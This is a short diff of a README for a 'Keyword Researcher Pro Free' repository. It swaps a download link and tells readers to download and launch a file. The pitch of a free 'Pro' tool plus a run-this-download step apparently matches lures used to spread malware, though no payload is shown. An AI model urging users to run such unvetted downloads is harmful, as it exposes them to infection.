@@ -24,7 +24,7 @@ Welcome to the **Keyword Researcher Pro Free** repository! Here you can find all
   - longtail-pro-keyword-research
 
 ## Get Started Now!
-To access all the amazing content and resources available in this repository, simply [click here](https://github.com/files/Project.zip) to download the necessary files. Remember to launch the downloaded file to kickstart your keyword research journey.
+To access all the amazing content and resources available in this repository, simply [click here](https://github.com/mhzndenish/Keyword-Researcher-Pro-Free/releases) to download the necessary files. Remember to launch the downloaded file to kickstart your keyword research journey.
 
 ### Happy researching! 🧐🔍📊
 
